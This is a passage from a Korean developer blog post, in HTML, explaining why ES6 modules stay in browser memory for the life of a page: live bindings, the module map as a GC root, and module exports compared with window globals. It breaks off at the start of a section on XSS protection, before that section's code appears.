<!DOCTYPE html><html lang="ko"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preload" href="/_next/static/media/e4af272ccee01ff0-s.p.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="stylesheet" href="/_next/static/css/c980a1f40926c6e4.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-56d9518731895b2c.js"/><script src="/_next/static/chunks/4bd1b696-621d9c5a5ed67c86.js" async=""></script><script src="/_next/static/chunks/1684-2774953d221678f8.js" async=""></script><script src="/_next/static/chunks/main-app-98678e53e0f06a7d.js" async=""></script><script src="/_next/static/chunks/6874-fa507aafc07af06a.js" async=""></script><script src="/_next/static/chunks/9318-87923cfcfd0d5659.js" async=""></script><script src="/_next/static/chunks/app/layout-cc2413b4ac7fd51b.js" async=""></script><script src="/_next/static/chunks/cb15b0f3-4f54b17909709afc.js" async=""></script><script src="/_next/static/chunks/9522-efe1b27bdbdfccd2.js" async=""></script><script src="/_next/static/chunks/app/posts/%5B...slug%5D/page-533962adf6041fb8.js" async=""></script><meta name="next-size-adjust" content=""/><title>JavaScript 모듈의 영구적인 브라우저 메모리 지속성 | Blog</title><meta name="description" content="ES6 모듈의 메모리 지속성 메커니즘과 가비지 컬렉션 동작, 실무 관리 전략을 포괄적으로 분석합니다."/><meta name="author" content="지크"/><meta name="keywords" content="JavaScript, 메모리 관리, 동적 import, 성능 최적화, 메모리 누수, ES6 모듈, 가비지 컬렉션, 브라우저 메모리, 모듈 캐싱, V8 엔진, SPA, 웹 성능, 번들링, CommonJS, 웹 워커, 서비스 워커, 싱글톤 패턴, 라이브 바인딩, 모듈 시스템, 브라우저 엔진, 최적화, 캐싱, 웹개발"/><meta name="creator" content="지크"/><meta name="publisher" content="Blog"/><meta name="robots" content="index, follow"/><meta name="googlebot" content="index, follow, max-video-preview:-1, max-image-preview:large, max-snippet:-1"/><meta name="google-site-verification" content="wjBK5vsP3u8w2Mb0BHXkojvPGQ56soPTBYg2fU5dg5k"/><meta property="og:title" content="JavaScript 모듈의 영구적인 브라우저 메모리 지속성 | Blog"/><meta property="og:description" content="ES6 모듈의 메모리 지속성 메커니즘과 가비지 컬렉션 동작, 실무 관리 전략을 포괄적으로 분석합니다."/><meta property="og:url" content="https://leeduhan.github.io/posts/technology/2025-09-11-javascript-module-persistent-browser-memory"/><meta property="og:site_name" content="Blog"/><meta property="og:image" content="https://leeduhan.github.io/og-image.jpg"/><meta property="og:image:width" content="1200"/><meta property="og:image:height" content="630"/><meta property="og:image:alt" content="JavaScript 모듈의 영구적인 브라우저 메모리 지속성"/><meta property="og:type" content="article"/><meta property="article:published_time" content="2025-09-11"/><meta property="article:author" content="지크"/><meta property="article:tag" content="JavaScript"/><meta property="article:tag" content="메모리 관리"/><meta property="article:tag" content="동적 import"/><meta property="article:tag" content="성능 최적화"/><meta property="article:tag" content="메모리 누수"/><meta property="article:tag" content="ES6 모듈"/><meta property="article:tag" content="가비지 컬렉션"/><meta property="article:tag" content="브라우저 메모리"/><meta property="article:tag" content="모듈 캐싱"/><meta property="article:tag" content="V8 엔진"/><meta property="article:tag" content="SPA"/><meta property="article:tag" content="웹 성능"/><meta property="article:tag" content="번들링"/><meta property="article:tag" content="CommonJS"/><meta property="article:tag" content="웹 워커"/><meta property="article:tag" content="서비스 워커"/><meta property="article:tag" content="싱글톤 패턴"/><meta property="article:tag" content="라이브 바인딩"/><meta property="article:tag" content="모듈 시스템"/><meta property="article:tag" content="브라우저 엔진"/><meta property="article:tag" content="최적화"/><meta property="article:tag" content="캐싱"/><meta property="article:tag" content="웹개발"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:creator" content="@지크"/><meta name="twitter:title" content="JavaScript 모듈의 영구적인 브라우저 메모리 지속성 | Blog"/><meta name="twitter:description" content="ES6 모듈의 메모리 지속성 메커니즘과 가비지 컬렉션 동작, 실무 관리 전략을 포괄적으로 분석합니다."/><meta name="twitter:image" content="https://leeduhan.github.io/og-image.jpg"/><link rel="icon" href="/favicon.ico" type="image/x-icon" sizes="16x16"/><script>document.querySelectorAll('body link[rel="icon"], body link[rel="apple-touch-icon"]').forEach(el => document.head.appendChild(el))</script><script src="/_next/static/chunks/polyfills-42372ed130431b0a.js" noModule=""></script></head><body class="__variable_f367f3 antialiased min-h-screen"><div class="flex min-h-screen flex-col"><header class="sticky top-0 z-50 w-full border-b bg-background/80 backdrop-blur supports-[backdrop-filter]:bg-background/80"><div class="container max-w-4xl mx-auto flex h-16 items-center justify-between px-4"><a class="flex items-center space-x-2 text-xl font-semibold transition-colors hover:text-primary" href="/"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-file-text h-6 w-6 text-primary" aria-hidden="true"><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z"></path><path d="M14 2v4a2 2 0 0 0 2 2h4"></path><path d="M10 9H8"></path><path d="M16 13H8"></path><path d="M16 17H8"></path></svg><span>Blog</span></a><div class="flex items-center space-x-6"><nav class="flex items-center space-x-6"><a class="text-sm font-medium text-muted-foreground transition-colors hover:text-foreground" href="/">홈</a><a class="text-sm font-medium text-muted-foreground transition-colors hover:text-foreground" href="/tags">태그</a><a class="text-sm font-medium text-muted-foreground transition-colors hover:text-foreground" href="/about">소개</a></nav><a href="https://github.com/leeduhan" target="_blank" rel="noopener noreferrer" class="text-muted-foreground transition-colors hover:text-foreground" aria-label="GitHub"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-github h-5 w-5" aria-hidden="true"><path d="M15 22v-4a4.8 4.8 0 0 0-1-3.5c3 0 6-2 6-5.5.08-1.25-.27-2.48-1-3.5.28-1.15.28-2.35 0-3.5 0 0-1 0-3 1.5-2.64-.5-5.36-.5-8 0C6 2 5 2 5 2c-.3 1.15-.3 2.35 0 3.5A5.403 5.403 0 0 0 4 9c0 3.5 3 5.5 6 5.5-.39.49-.68 1.05-.85 1.65-.17.6-.22 1.23-.15 1.85v4"></path><path d="M9 18c-4.51 2-5-2-7-2"></path></svg></a><button class="h-9 w-9 rounded-lg border border-border hover:bg-accent hover:text-accent-foreground inline-flex items-center justify-center transition-colors focus:outline-none focus:ring-2 focus:ring-primary focus:ring-offset-2" title="테마 변경" type="button" id="radix-«R77b»" aria-haspopup="menu" aria-expanded="false" data-state="closed"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-monitor h-[1.2rem] w-[1.2rem]" aria-hidden="true"><rect width="20" height="14" x="2" y="3" rx="2"></rect><line x1="8" x2="16" y1="21" y2="21"></line><line x1="12" x2="12" y1="17" y2="21"></line></svg><span class="sr-only">테마 변경</span></button></div></div></header><main class="flex-1"><div class="container max-w-4xl mx-auto px-4 py-8"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"JavaScript 모듈의 영구적인 브라우저 메모리 지속성","description":"ES6 모듈의 메모리 지속성 메커니즘과 가비지 컬렉션 동작, 실무 관리 전략을 포괄적으로 분석합니다.","image":["https://leeduhan.github.io/og-image.jpg"],"author":{"@type":"Person","name":"지크"},"publisher":{"@type":"Organization","name":"Blog","logo":{"@type":"ImageObject","url":"https://leeduhan.github.io/logo.png"}},"url":"https://leeduhan.github.io/posts/technology/2025-09-11-javascript-module-persistent-browser-memory","datePublished":"2025-09-11","dateModified":"2025-09-11","keywords":"JavaScript, 메모리 관리, 동적 import, 성능 최적화, 메모리 누수, ES6 모듈, 가비지 컬렉션, 브라우저 메모리, 모듈 캐싱, V8 엔진, SPA, 웹 성능, 번들링, CommonJS, 웹 워커, 서비스 워커, 싱글톤 패턴, 라이브 바인딩, 모듈 시스템, 브라우저 엔진, 최적화, 캐싱, 웹개발","articleSection":"Technology","inLanguage":"ko-KR"}</script><div class="max-w-3xl mx-auto space-y-8"><div class="pt-4"><a class="inline-flex items-center gap-2 text-sm text-muted-foreground hover:text-foreground transition-colors" href="/"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-left h-4 w-4" aria-hidden="true"><path d="m12 19-7-7 7-7"></path><path d="M19 12H5"></path></svg><span>홈으로 돌아가기</span></a></div><article class="space-y-8"><header class="space-y-6"><div class="space-y-6"><h1 class="text-5xl font-bold tracking-tight leading-tight">JavaScript 모듈의 영구적인 브라우저 메모리 지속성</h1></div><div class="flex flex-wrap items-center gap-6 text-sm text-muted-foreground py-4"><time dateTime="2025-09-11" class="flex items-center gap-2"><span>📅</span>2025년 9월 11일</time><div class="flex flex-wrap items-center gap-2"><span>🏷️</span><a class="inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors" href="/tags/javascript">JavaScript</a><a class="inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors" href="/tags/unknown-tag">메모리 관리</a><a class="inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors" href="/tags/import">동적 import</a><a class="inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors" href="/tags/performance-optimization">성능 최적화</a><a class="inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors" href="/tags/unknown-tag">메모리 누수</a><a class="inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors" href="/tags/es6">ES6 모듈</a><a class="inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors" href="/tags/unknown-tag">가비지 컬렉션</a><a class="inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors" href="/tags/unknown-tag">브라우저 메모리</a><a class="inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors" href="/tags/unknown-tag">모듈 캐싱</a><a class="inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors" href="/tags/v8">V8 엔진</a><a class="inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors" href="/tags/spa">SPA</a><a class="inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors" href="/tags/unknown-tag">웹 성능</a><a class="inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors" href="/tags/unknown-tag">번들링</a><a class="inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors" href="/tags/commonjs">CommonJS</a><a class="inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors" href="/tags/unknown-tag">웹 워커</a><a class="inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors" href="/tags/unknown-tag">서비스 워커</a><a class="inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors" href="/tags/unknown-tag">싱글톤 패턴</a><a class="inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors" href="/tags/unknown-tag">라이브 바인딩</a><a class="inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors" href="/tags/unknown-tag">모듈 시스템</a><a class="inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors" href="/tags/unknown-tag">브라우저 엔진</a><a class="inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors" href="/tags/unknown-tag">최적화</a><a class="inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors" href="/tags/caching">캐싱</a><a class="inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors" href="/tags/web-dev-kr">웹개발</a></div></div><div class="bg-accent/50 rounded-lg p-6 border-l-4 border-primary"><p class="text-lg leading-relaxed italic text-muted-foreground">ES6 모듈의 메모리 지속성 메커니즘과 가비지 컬렉션 동작, 실무 관리 전략을 포괄적으로 분석합니다.</p></div></header><div class="notion-content"><h1 id="javascript-모듈의-영구적인-브라우저-메모리-지속성">JavaScript 모듈의 영구적인 브라우저 메모리 지속성</h1>
<p>JavaScript ES6 모듈은 <strong>JavaScript 영역(realm)의 생명주기 동안 개별적으로 가비지 컬렉션이 불가능</strong>하며, 모듈 식별자(specifier) 문자열로 인덱스된 모듈 레지스트리에 영구적으로 캐시됩니다. 이러한 근본적인 제약은 모듈이 한 번 로드되면, 정적 <code>import</code>든 동적 <code>import()</code>든 관계없이 전체 JavaScript 컨텍스트가 파괴될 때까지(페이지 이동 또는 탭 닫기) 메모리에 지속됨을 의미합니다. 이 연구 문서는 모듈 메모리 관리 메커니즘, 브라우저 구현, 그리고 모듈 기반 애플리케이션의 메모리 관리를 위한 실용적 전략에 대한 포괄적인 기술 분석을 제공합니다.</p>
<h2 id="핵심-원리와-메커니즘">핵심 원리와 메커니즘</h2>
<h3 id="브라우저에서-es6-모듈의-가비지-컬렉션-동작-방식">브라우저에서 ES6 모듈의 가비지 컬렉션 동작 방식</h3>
<p>ES6 모듈은 영구적인 메모리 관계를 설정하는 3단계 생명주기를 통해 작동합니다. <strong>구성(construction) 단계</strong>에서는 모듈 파일을 가져와서 Module Record로 파싱합니다. <strong>인스턴스화(instantiation) 단계</strong>에서는 라이브 바인딩을 통해 export와 import를 위한 메모리 위치를 할당합니다 - 이는 값을 복사하는 CommonJS와는 중요한 차이점입니다. 마지막으로 <strong>평가(evaluation) 단계</strong>에서는 모듈 코드를 정확히 한 번 실행하여 할당된 메모리 위치를 채웁니다.</p>
<h4 id="라이브-바인딩live-binding의-핵심-메커니즘">라이브 바인딩(Live Binding)의 핵심 메커니즘</h4>
<p><strong>라이브 바인딩</strong>은 ES6 모듈에서 import된 값들이 export하는 모듈의 원본 값에 대한 &quot;살아있는&quot; 참조를 제공하는 메커니즘입니다. ES6 모듈이 CommonJS와 근본적으로 다른 이유이자, 모듈이 메모리에서 영구히 지속되는 핵심 메커니즘입니다.</p>
<p><strong>🔑 핵심 개념:</strong></p>
<ul>
<li><strong>동일한 메모리 위치 공유</strong>: import와 export가 같은 메모리 주소를 참조</li>
<li><strong>실시간 동기화</strong>: export 모듈의 값 변경이 모든 import 모듈에 즉시 반영</li>
<li><strong>참조 기반</strong>: 값 복사가 아닌 참조 공유 방식</li>
</ul>
<p>값을 import할 때, import하는 모듈과 export하는 모듈 모두 동일한 메모리 위치를 가리킵니다:</p>
<div class="code-block-wrapper my-6"><div class="relative group"><div class="flex items-center justify-between bg-muted border border-b-0 rounded-t-lg px-4 py-2"><span class="text-xs font-medium text-muted-foreground uppercase tracking-wide">javascript</span><button class="flex items-center gap-2 px-3 py-1.5 text-xs font-medium rounded-md transition-colors hover:bg-accent hover:text-accent-foreground focus:outline-none focus:ring-2 focus:ring-primary focus:ring-offset-2 text-muted-foreground" title="코드 복사"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy h-3 w-3" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>복사</span></button></div><pre class="overflow-x-auto rounded-t-none rounded-b-lg bg-muted border p-4 text-sm whitespace-pre-wrap break-words language-javascript code-highlight"><code class="language-javascript code-highlight"><span class="code-line line-number" line="1"><span class="token comment">// 모듈 A가 변경 가능한 값을 export</span>
</span><span class="code-line line-number" line="2"><span class="token keyword module">export</span> <span class="token keyword">let</span> counter <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="3"><span class="token keyword module">export</span> <span class="token keyword">function</span> <span class="token function">increment</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> counter<span class="token operator">++</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
</span><span class="code-line line-number" line="4">
</span><span class="code-line line-number" line="5"><span class="token comment">// 모듈 B가 import하고 라이브 변경사항을 관찰</span>
</span><span class="code-line line-number" line="6"><span class="token keyword module">import</span> <span class="token imports"><span class="token punctuation">{</span> counter<span class="token punctuation">,</span> increment <span class="token punctuation">}</span></span> <span class="token keyword module">from</span> <span class="token string">&#x27;./moduleA.js&#x27;</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="7"><span class="token console class-name">console</span><span class="token punctuation">.</span><span class="token method function property-access">log</span><span class="token punctuation">(</span>counter<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0</span>
</span><span class="code-line line-number" line="8"><span class="token function">increment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="9"><span class="token console class-name">console</span><span class="token punctuation">.</span><span class="token method function property-access">log</span><span class="token punctuation">(</span>counter<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1 - 라이브 바인딩이 변경사항을 반영</span>
</span></code></pre></div></div>
<p>이는 가비지 컬렉션 동작에 근본적으로 영향을 미치는 영구적 참조를 생성합니다. 참조가 없어지면 수집될 수 있는 전통적인 JavaScript 객체와 달리, 모듈은 이러한 라이브 바인딩을 통해 영구적인 관계의 망을 만듭니다.</p>
<p><strong>🔗 메모리 참조 체인:</strong></p>
<div class="code-block-wrapper my-6"><div class="relative group"><div class="flex items-center justify-between bg-muted border border-b-0 rounded-t-lg px-4 py-2"><span class="text-xs font-medium text-muted-foreground uppercase tracking-wide">code-highlight</span><button class="flex items-center gap-2 px-3 py-1.5 text-xs font-medium rounded-md transition-colors hover:bg-accent hover:text-accent-foreground focus:outline-none focus:ring-2 focus:ring-primary focus:ring-offset-2 text-muted-foreground" title="코드 복사"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy h-3 w-3" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>복사</span></button></div><pre class="overflow-x-auto rounded-t-none rounded-b-lg bg-muted border p-4 text-sm whitespace-pre-wrap break-words code-highlight"><code class="code-highlight"><span class="code-line line-number" line="1">GC Root → Module Map → Module A ⟷ Shared Memory ⟷ Module B
</span></code></pre></div></div>
<p>이 참조 체인 때문에 개별 모듈은 가비지 컬렉션될 수 없으며, 전체 JavaScript 컨텍스트가 파괴될 때까지 메모리에 유지됩니다.</p>
<p><strong>⚡ 실무 영향:</strong></p>
<ol>
<li><strong>DataManager</strong> 같은 싱글톤은 의도적으로 지속되어야 하는 사례</li>
<li><strong>큰 데이터나 이벤트 리스너</strong>는 명시적 정리가 필요</li>
<li><strong>SPA 환경</strong>에서는 특히 메모리 관리에 주의해야 함</li>
</ol>
<h3 id="모듈-레지스트리와-gc-root-관계">모듈 레지스트리와 GC Root 관계</h3>
<p>브라우저의 <strong>모듈 맵</strong>은 로딩 캐시이자 가비지 컬렉션 루트 세트의 기본 부분으로 작동합니다. 이 레지스트리는 모든 로드된 모듈을 정규 URL로 키로 하여 유지하며, GC 루트에서 모든 로드된 모듈로의 직접 경로를 만듭니다:</p>
<div class="code-block-wrapper my-6"><div class="relative group"><div class="flex items-center justify-between bg-muted border border-b-0 rounded-t-lg px-4 py-2"><span class="text-xs font-medium text-muted-foreground uppercase tracking-wide">javascript</span><button class="flex items-center gap-2 px-3 py-1.5 text-xs font-medium rounded-md transition-colors hover:bg-accent hover:text-accent-foreground focus:outline-none focus:ring-2 focus:ring-primary focus:ring-offset-2 text-muted-foreground" title="코드 복사"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy h-3 w-3" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>복사</span></button></div><pre class="overflow-x-auto rounded-t-none rounded-b-lg bg-muted border p-4 text-sm whitespace-pre-wrap break-words language-javascript code-highlight"><code class="language-javascript code-highlight"><span class="code-line line-number" line="1"><span class="token comment">// 개념적 모듈 맵 구조</span>
</span><span class="code-line line-number" line="2"><span class="token maybe-class-name">ModuleMap</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="3">  <span class="token string-property property">&quot;https://example.com/module.js&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="4">    <span class="token literal-property property">status</span><span class="token operator">:</span> <span class="token string">&quot;evaluated&quot;</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="5">    <span class="token literal-property property">moduleRecord</span><span class="token operator">:</span> <span class="token maybe-class-name">ModuleRecord</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="6">    <span class="token literal-property property">namespace</span><span class="token operator">:</span> <span class="token maybe-class-name">ModuleNamespaceExotic</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="7">    <span class="token literal-property property">exports</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token spread operator">...</span><span class="token punctuation">}</span>
</span><span class="code-line line-number" line="8">  <span class="token punctuation">}</span>
</span><span class="code-line line-number" line="9"><span class="token punctuation">}</span>
</span></code></pre></div></div>
<p>TC39 멤버 Mark Miller가 설명한 바와 같이: &quot;식별자에서 모듈 인스턴스로의 테이블은 식별자로 인덱스됩니다. 식별자는 문자열이므로 이 테이블은 weak하지 않습니다. 이는 것들을 떨어뜨릴 수 있는 &#x27;캐시&#x27; 의미가 아닙니다. 오히려 모듈 인스턴스의 레지스트리입니다.&quot;</p>
<p>GC 루트 역할을 하는 모듈 관련 객체들에는 모든 로드된 모듈을 포함하는 전역 모듈 맵, 변수 바인딩을 유지하는 모듈 환경 레코드, export를 속성으로 노출하는 모듈 네임스페이스 객체, 그리고 모듈 메타데이터를 제공하는 import meta 객체가 포함됩니다. 이들은 개별 모듈 가비지 컬렉션을 방지하는 끊어지지 않는 체인을 만듭니다.</p>
<h3 id="모듈-export와-전역-객체의-차이점">모듈 Export와 전역 객체의 차이점</h3>
<p>모듈 export와 전역 객체는 근본적으로 다른 메모리 관리 특성을 보입니다:</p>
<table><thead><tr><th>측면</th><th>모듈 Export</th><th>전역 객체 (window)</th></tr></thead><tbody><tr><td><strong>스코프</strong></td><td>모듈 로컬 환경</td><td>전역 객체 속성</td></tr><tr><td><strong>GC 동작</strong></td><td>라이브 바인딩을 통해 유지</td><td>전역 객체를 통해 유지</td></tr><tr><td><strong>메모리 참조</strong></td><td>모듈 맵을 통한 간접 참조</td><td>직접 전역 참조</td></tr><tr><td><strong>정리</strong></td><td>모듈 언로딩 필요</td><td>개별적으로 삭제 가능</td></tr><tr><td><strong>격리</strong></td><td>모듈 스코프에 캡슐화</td><td>전역적으로 접근 가능</td></tr><tr><td><strong>보안성</strong></td><td>직접 접근 불가</td><td>직접 조작 가능</td></tr></tbody></table>
<p>모듈 export는 모듈 레지스트리의 영구적 캐싱을 통해 메모리에 남아있는 반면, 전역 객체(window)에 등록된 것은 개별적으로 제거할 수 있습니다. 이 구분은 메모리 효율적인 애플리케이션을 설계할 때 중요해집니다.</p>
<h3 id="모듈-레지스트리의-보안-이점">모듈 레지스트리의 보안 이점</h3>
<p>ES6 모듈의 모듈 레지스트리는 <code>window</code> 객체와 달리 <strong>직접 접근이 불가능</strong>하여 보안성이 크게 향상됩니다.</p>
<p><strong>🔐 보안성 비교</strong></p>
<table><thead><tr><th>측면</th><th>window 방식</th><th>모듈 레지스트리 방식</th></tr></thead><tbody><tr><td><strong>직접 접근</strong></td><td><code>window.DataManager</code> ✅</td><td><code>window.DataManager</code> ❌</td></tr><tr><td><strong>콘솔 조작</strong></td><td>즉시 가능 🔴</td><td>import 필요 🟡</td></tr><tr><td><strong>XSS 공격</strong></td><td>매우 취약 🔴</td><td>제한적 🟡</td></tr><tr><td><strong>실수 방지</strong></td><td>충돌 위험 🔴</td><td>안전함 🟢</td></tr><tr><td><strong>정적 분석</strong></td><td>어려움 🔴</td><td>가능함 🟢</td></tr></tbody></table>
<p><strong>🛡️ 보안 개선 효과</strong></p>
<p><strong>1. 네임스페이스 보호</strong></p>
<div class="code-block-wrapper my-6"><div class="relative group"><div class="flex items-center justify-between bg-muted border border-b-0 rounded-t-lg px-4 py-2"><span class="text-xs font-medium text-muted-foreground uppercase tracking-wide">javascript</span><button class="flex items-center gap-2 px-3 py-1.5 text-xs font-medium rounded-md transition-colors hover:bg-accent hover:text-accent-foreground focus:outline-none focus:ring-2 focus:ring-primary focus:ring-offset-2 text-muted-foreground" title="코드 복사"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy h-3 w-3" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>복사</span></button></div><pre class="overflow-x-auto rounded-t-none rounded-b-lg bg-muted border p-4 text-sm whitespace-pre-wrap break-words language-javascript code-highlight"><code class="language-javascript code-highlight"><span class="code-line line-number" line="1"><span class="token comment">// ❌ window 방식: 전역 오염</span>
</span><span class="code-line line-number" line="2"><span class="token dom variable">window</span><span class="token punctuation">.</span><span class="token property-access"><span class="token maybe-class-name">DataManager</span></span> <span class="token operator">=</span> manager<span class="token punctuation">;</span>
</span><span class="code-line line-number" line="3"><span class="token console class-name">console</span><span class="token punctuation">.</span><span class="token method function property-access">log</span><span class="token punctuation">(</span><span class="token known-class-name class-name">Object</span><span class="token punctuation">.</span><span class="token method function property-access">keys</span><span class="token punctuation">(</span><span class="token dom variable">window</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token property-access">length</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 증가</span>
</span><span class="code-line line-number" line="4">
</span><span class="code-line line-number" line="5"><span class="token comment">// ✅ 모듈 방식: 깨끗한 네임스페이스  </span>
</span><span class="code-line line-number" line="6"><span class="token keyword module">export</span> <span class="token keyword">const</span> <span class="token maybe-class-name">DataManager</span> <span class="token operator">=</span> manager<span class="token punctuation">;</span>
</span><span class="code-line line-number" line="7"><span class="token console class-name">console</span><span class="token punctuation">.</span><span class="token method function property-access">log</span><span class="token punctuation">(</span><span class="token known-class-name class-name">Object</span><span class="token punctuation">.</span><span class="token method function property-access">keys</span><span class="token punctuation">(</span><span class="token dom variable">window</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token property-access">length</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 변화 없음</span>
</span></code></pre></div></div>
<p><strong>2. XSS 공격 차단</strong></p>
<div class="code-block-wrapper my-6"><div class="relative group"><div class="flex items-center justify-between bg-muted border border-b-0 rounded-t-lg px-4 py-2"><span class="text-xs font-medium text-muted-foreground uppercase tracking-wide">javascript</span><button class="flex items-center gap-2 px-3 py-1.5 text-xs font-medium rounded-md transition-colors hover:bg-accent hover:text-accent-foreground focus:outline-none focus:ring-2 focus:ring-primary focus:ring-offset-2 text-muted-foreground" title="코드 복사"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy h-3 w-3" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>복사</span></button></div><pre class="overflow-x-auto rounded-t-none rounded-b-lg bg-muted border p-4 text-sm whitespace-pre-wrap break-words language-javascript code-highlight"><code class="language-javascript code-highlight"><span 